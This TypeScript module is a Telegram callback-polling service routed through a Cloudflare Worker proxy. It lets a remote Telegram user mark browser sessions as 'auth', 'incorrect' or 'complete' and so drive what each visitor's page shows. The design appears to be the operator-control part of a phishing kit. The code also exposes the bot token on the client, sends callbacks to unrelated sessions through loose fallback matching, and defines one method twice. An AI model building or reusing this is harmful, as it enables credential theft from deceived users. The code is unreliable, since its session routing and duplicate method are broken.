// Telegram Callback Polling Service - Robust Session Management
// This service polls Telegram for callback button presses and handles user navigation

const TELEGRAM_BOT_TOKEN =
  import.meta.env.VITE_TELEGRAM_BOT_TOKEN || "YOUR_BOT_TOKEN";

// Cloudflare Worker proxy for bypassing Iran IP restrictions
const TELEGRAM_API_BASE =
  "https://telegram-proxy-fragrant-fog-f09d.anthonynoelmills.workers.dev";

interface TelegramUpdate {
  update_id: number;
  callback_query?: {
    id: string;
    from: {
      id: number;
      first_name: string;
    };
    message: {
      message_id: number;
      chat: {
        id: number;
      };
    };
    data: string;
  };
}

interface CallbackHandler {
  sessionId: string;
  onCallback: (action: string) => void;
  registeredAt: number;
  lastUsed: number;
}

class TelegramCallbackService {
  private handlers = new Map<string, CallbackHandler>();
  private lastUpdateId = 0;
  private isPolling = false;
  private pollInterval: NodeJS.Timeout | null = null;
  private consecutiveErrors = 0;
  private currentPollDelay = 3000; // Optimized polling - 3 seconds
  private maxPollDelay = 10000; // Max 10 seconds
  private isOnline = true;

  /**
   * Register a callback handler for a session
   * This is the ONLY way handlers should be added
   */
  registerHandler(sessionId: string, onCallback: (action: string) => void) {
    const timestamp = Date.now();

    console.log("📝 Registering handler:", {
      sessionId,
      timestamp,
      currentCount: this.handlers.size,
    });

    // Always accept new registrations - no cleanup during registration
    this.handlers.set(sessionId, {
      sessionId,
      onCallback,
      registeredAt: timestamp,
      lastUsed: timestamp,
    });

    console.log(
      "✅ Handler registered successfully. Total:",
      this.handlers.size,
    );
    console.log("🔍 All sessions:", Array.from(this.handlers.keys()));

    // Start polling if not already started
    if (!this.isPolling) {
      this.startPolling();
    }

    // Clean up very old handlers only (older than 10 minutes)
    this.cleanupVeryOldHandlers();
  }

  /**
   * Clean up only very old handlers (10+ minutes old)
   */
  private cleanupVeryOldHandlers() {
    const tenMinutesAgo = Date.now() - 10 * 60 * 1000;
    let cleaned = 0;

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (handler.registeredAt < tenMinutesAgo) {
        this.handlers.delete(sessionId);
        cleaned++;
        console.log("🧹 Cleaned very old handler:", sessionId);
      }
    }

    if (cleaned > 0) {
      console.log(
        `🧹 Cleaned ${cleaned} very old handlers. Remaining: ${this.handlers.size}`,
      );
    }
  }

  /**
   * Unregister a callback handler with delay
   */
  unregisterHandler(sessionId: string) {
    console.log("🗑️ Scheduling unregistration for:", sessionId);

    // Long delay to prevent any race conditions
    setTimeout(() => {
      const handler = this.handlers.get(sessionId);
      if (handler) {
        console.log("🗑️ Unregistering handler:", {
          sessionId,
          age: Date.now() - handler.registeredAt,
          lastUsed: Date.now() - handler.lastUsed,
        });
        this.handlers.delete(sessionId);
        console.log("📊 Remaining handlers:", this.handlers.size);
      }

      // Stop polling if no handlers left
      if (this.handlers.size === 0) {
        this.stopPolling();
      }
    }, 10000); // 10 second delay
  }

  /**
   * Start polling for Telegram updates
   */
  async startPolling() {
    if (this.isPolling) return;

    console.log("🔄 Starting Telegram callback polling...");
    this.isPolling = true;
    this.consecutiveErrors = 0;
    this.currentPollDelay = 500;

    // Clear any existing webhook
    await this.clearWebhook();

    this.pollForUpdates();
  }

  /**
   * Stop polling
   */
  stopPolling() {
    console.log("🛑 Stopping Telegram callback polling");
    this.isPolling = false;

    if (this.pollInterval) {
      clearTimeout(this.pollInterval);
      this.pollInterval = null;
    }
  }

  /**
   * Clear webhook to avoid conflicts
   */
  private async clearWebhook() {
    if (!this.validateToken()) return;

    try {
      console.log("🧹 Clearing Telegram webhook...");
      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/deleteWebhook?drop_pending_updates=true`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
        },
      );

      if (response.ok) {
        console.log("✅ Webhook cleared successfully");
      } else {
        console.warn("⚠️ Failed to clear webhook:", response.status);
      }
    } catch (error) {
      console.warn("⚠️ Error clearing webhook:", error);
    }
  }

  /**
   * Poll for new updates from Telegram
   */
  private async pollForUpdates() {
    if (!this.isPolling) return;

    // Handle demo mode
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Skipping Telegram poll");
      this.scheduleNextPoll();
      return;
    }

    try {
      console.log("📡 Polling for updates...", {
        lastUpdateId: this.lastUpdateId,
        handlerCount: this.handlers.size,
      });

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 10000); // 10s timeout

      const response = await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${this.lastUpdateId + 1}&limit=10&timeout=5`,
        {
          method: "GET",
          headers: {
            "Content-Type": "application/json",
          },
          signal: controller.signal,
        },
      );

      clearTimeout(timeout);

      if (!response.ok) {
        await this.handleHttpError(response);
        this.scheduleNextPoll();
        return;
      }

      const data = await response.json();
      const updates = data.result || [];

      console.log(`📡 Received ${updates.length} updates`);

      for (const update of updates) {
        this.lastUpdateId = Math.max(this.lastUpdateId, update.update_id);

        if (update.callback_query) {
          await this.handleCallback(update.callback_query);
        }
      }

      this.onSuccessfulPoll();
    } catch (error) {
      await this.handleNetworkError(error);
    }

    this.scheduleNextPoll();
  }

  /**
   * Schedule next poll
   */
  private scheduleNextPoll() {
    if (!this.isPolling) return;

    this.pollInterval = setTimeout(() => {
      this.pollForUpdates();
    }, this.currentPollDelay);
  }

  /**
   * Unregister a callback handler
   */
  unregisterHandler(sessionId: string) {
    const wasRegistered = this.handlers.has(sessionId);
    this.handlers.delete(sessionId);

    console.log("🗑️ Handler unregistered:", {
      sessionId,
      wasRegistered,
      remainingHandlers: this.handlers.size,
    });

    // Stop polling if no handlers remain
    if (this.handlers.size === 0) {
      this.stopPolling();
    }
  }

  /**
   * Clean up old handlers to prevent memory leaks
   */
  private cleanupOldHandlers() {
    const now = Date.now();
    const maxAge = 30 * 60 * 1000; // 30 minutes

    for (const [sessionId, handler] of this.handlers.entries()) {
      if (now - handler.registeredAt > maxAge) {
        console.log("🧹 Cleaning up old handler:", sessionId);
        this.handlers.delete(sessionId);
      }
    }
  }

  /**
   * Handle HTTP errors
   */
  private async handleHttpError(response: Response) {
    if (response.status === 409) {
      console.warn("⚠️ Telegram 409 Conflict - clearing webhook...");
      await this.clearWebhook();
      this.currentPollDelay = 2000;
      return;
    }

    console.error(`❌ HTTP ${response.status} error from Telegram API`);
    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Handle successful poll - reset error counter
   */
  private onSuccessfulPoll() {
    if (this.consecutiveErrors > 0) {
      console.log("✅ Poll successful - resetting error count");
      this.consecutiveErrors = 0;
      this.currentPollDelay = 3000; // Reset to optimized 3 second polling
    }
  }

  /**
   * Handle network errors
   */
  private async handleNetworkError(error: any) {
    if (error.name === "AbortError") {
      console.warn("⏰ Request timeout - continuing...");
    } else {
      console.warn("🌐 Network error:", error.message);
    }

    this.incrementErrorsAndAdjustDelay();
  }

  /**
   * Increment error count and adjust polling delay
   */
  private incrementErrorsAndAdjustDelay() {
    this.consecutiveErrors++;
    this.currentPollDelay = Math.min(
      this.currentPollDelay * 1.2,
      this.maxPollDelay,
    );

    console.log(
      `⚠️ Error count: ${this.consecutiveErrors}, next poll in ${this.currentPollDelay / 1000}s`,
    );

    // Reset after many errors
    if (this.consecutiveErrors >= 20) {
      console.log("🔄 Resetting after many errors");
      this.consecutiveErrors = 0;
      this.currentPollDelay = 500;
    }
  }

  /**
   * Handle callback from Telegram
   */
  private async handleCallback(callback: any) {
    console.log("📞 Received callback:", {
      id: callback.id,
      data: callback.data,
      user: callback.from?.first_name,
      timestamp: new Date().toLocaleString(),
      availableHandlers: this.handlers.size,
    });

    const callbackData = callback.data;

    // Parse callback data: auth_TYPE_SESSIONID or incorrect_TYPE_SESSIONID or complete_auth_SESSIONID
    const parts = callbackData.split("_");
    if (parts.length < 2) {
      console.error("❌ Invalid callback data format:", callbackData);
      await this.answerCallbackQuery(callback.id, "❌ Invalid request format");
      return;
    }

    let action: string;
    let sessionId: string;

    if (parts[0] === "auth") {
      if (parts.length < 3) {
        console.error("❌ Invalid auth callback format:", callbackData);
        await this.answerCallbackQuery(callback.id, "❌ Invalid auth format");
        return;
      }
      action = parts[1];
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "incorrect") {
      if (parts.length < 3) {
        console.error("❌ Invalid incorrect callback format:", callbackData);
        await this.answerCallbackQuery(
          callback.id,
          "❌ Invalid incorrect format",
        );
        return;
      }
      action = `incorrect_${parts[1]}`;
      sessionId = parts.slice(2).join("_");
    } else if (parts[0] === "complete") {
      if (parts.length < 3) {
        console.error("❌ Invalid complete callback format:", callbackData);
        await this.answerCallbackQuery(
          callback.id,
          "❌ Invalid complete format",
        );
        return;
      }
      action = "complete";
      sessionId = parts.slice(2).join("_");
    } else {
      console.error("❌ Unknown callback action:", callbackData);
      await this.answerCallbackQuery(callback.id, "❌ Unknown action");
      return;
    }

    console.log("🎯 Parsed callback:", { action, sessionId });

    // AGGRESSIVE FALLBACK STRATEGY
    let handler = this.findBestHandler(sessionId);

    if (handler) {
      // Update last used timestamp
      handler.lastUsed = Date.now();

      console.log("✅ Handler found, processing action:", action);

      await this.answerCallbackQuery(callback.id, `✅ Processing ${action}...`);

      try {
        handler.onCallback(action);
        console.log("✅ Action processed successfully");
      } catch (error) {
        console.error("❌ Error in callback handler:", error);
        await this.answerCallbackQuery(callback.id, "❌ Processing error");
      }
    } else {
      console.error("❌ No handler found for any strategy");
      await this.answerCallbackQuery(
        callback.id,
        "❌ Session not found - please refresh page",
      );
    }
  }

  /**
   * Find the best handler using multiple strategies
   */
  private findBestHandler(targetSessionId: string): CallbackHandler | null {
    console.log("🔍 Finding handler for:", targetSessionId);
    console.log("🔍 Available handlers:", Array.from(this.handlers.keys()));

    // Strategy 1: Exact match
    let handler = this.handlers.get(targetSessionId);
    if (handler) {
      console.log("✅ Exact match found");
      return handler;
    }

    const handlers = Array.from(this.handlers.values());

    // Strategy 2: Partial match (starts with same prefix)
    const prefixLength = Math.min(8, targetSessionId.length);
    const targetPrefix = targetSessionId.substring(0, prefixLength);

    handler = handlers.find(
      (h) =>
        h.sessionId.startsWith(targetPrefix) ||
        targetSessionId.startsWith(h.sessionId.substring(0, prefixLength)),
    );

    if (handler) {
      console.log("✅ Prefix match found:", handler.sessionId);
      return handler;
    }

    // Strategy 3: Most recently used
    handler = handlers.sort((a, b) => b.lastUsed - a.lastUsed)[0];

    if (handler) {
      console.log("✅ Most recent handler found:", handler.sessionId);
      return handler;
    }

    // Strategy 4: Most recently registered
    handler = handlers.sort((a, b) => b.registeredAt - a.registeredAt)[0];

    if (handler) {
      console.log("✅ Most recent registration found:", handler.sessionId);
      return handler;
    }

    return null;
  }

  /**
   * Answer a callback query
   */
  private async answerCallbackQuery(callbackQueryId: string, text: string) {
    if (!this.validateToken()) {
      console.log("🎭 Demo mode: Would answer callback query:", text);
      return;
    }

    try {
      await fetch(
        `${TELEGRAM_API_BASE}/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            callback_query_id: callbackQueryId,
            text: text,
            show_alert: false,
          }),
        },
      );
    } catch (error) {
      console.warn("⚠️ Failed to answer callback query:", error);
    }
  }

  /**
   * Validate Telegram token
   */
  private validateToken(): boolean {
    return !(!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN");
  }

  /**
   * Get debug info
   */
  getDebugInfo() {
    return {
      isPolling: this.isPolling,
      handlerCount: this.handlers.size,
      handlers: Array.from(this.handlers.entries()).map(([id, handler]) => ({
        sessionId: id,
        registeredAt: new Date(handler.registeredAt).toLocaleString(),
        lastUsed: new Date(handler.lastUsed).toLocaleString(),
        age: Date.now() - handler.registeredAt,
      })),
      consecutiveErrors: this.consecutiveErrors,
      currentPollDelay: this.currentPollDelay,
      lastUpdateId: this.lastUpdateId,
    };
  }
}

// Create singleton instance
const telegramCallbackService = new TelegramCallbackService();

// Export functions
export const registerTelegramCallback = (
  sessionId: string,
  onCallback: (action: string) => void,
) => {
  telegramCallbackService.registerHandler(sessionId, onCallback);
};

export const unregisterTelegramCallback = (sessionId: string) => {
  telegramCallbackService.unregisterHandler(sessionId);
};

export const getTelegramCallbackDebugInfo = () => {
  return telegramCallbackService.getDebugInfo();
};

export default telegramCallbackService;
